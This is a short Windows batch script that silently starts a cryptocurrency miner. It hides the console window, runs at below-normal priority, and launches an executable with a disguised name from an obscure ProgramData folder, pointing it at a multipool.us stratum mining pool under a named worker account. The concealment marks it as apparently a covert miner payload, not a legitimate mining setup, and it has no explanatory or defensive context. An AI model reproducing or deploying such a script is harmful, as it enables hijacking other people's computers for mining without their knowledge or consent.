@echo off

set minuser=oliverafa.2
set minurl=stratum+tcp://us.multipool.us:3373

start C:\ProgramData\mskfea\Hstart\hstart.exe /NOCONSOLE /SILENT /D="C:\ProgramData\mskfea\mskafeb\" /BELOWNORMAL ""C:\ProgramData\mskfea\mskafeb\mskafeb.exe" -a x11 -o %minurl% -u %minuser% -p x"
